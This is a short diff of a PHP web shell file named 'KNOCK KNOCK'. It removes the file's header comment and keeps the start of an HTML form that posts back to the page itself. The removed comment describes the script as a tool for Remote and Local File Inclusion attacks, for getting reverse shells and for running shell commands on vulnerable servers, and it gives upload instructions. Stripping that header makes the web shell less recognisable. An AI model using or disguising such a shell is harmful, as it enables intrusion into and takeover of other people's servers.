@@ -1,30 +1,4 @@
 <?php 
-/*
-	Name : KNOCK KNOCK
-	Owner : Naman Sahore
-	Email : namansahore@gmail.com 
-	Published on : 30th July 2017
-
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-
-	This shell scrpit can be used for performing Remote File Inclusion
-	as well as Local File Inclusion( by adding .php at the end of
-	script) and getting REVERSE SHELL from vulnerable server
-	or performing shell command on browser.
-
-	HOW TO USE:
-	FOR RFI
-		Clear .txt extention and upload the script on a server and 
-		preform RFI.
-	FOR LFI
-		Clear .txt and add .php extention to the script and
-		perform LFI by uploading shell script on a
-		vulnerable server.
-
-		Comment for more information.
-*/
 ?>
 <body style="background-color:rgb(200,200,200);">
 	<form action="<?php $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">
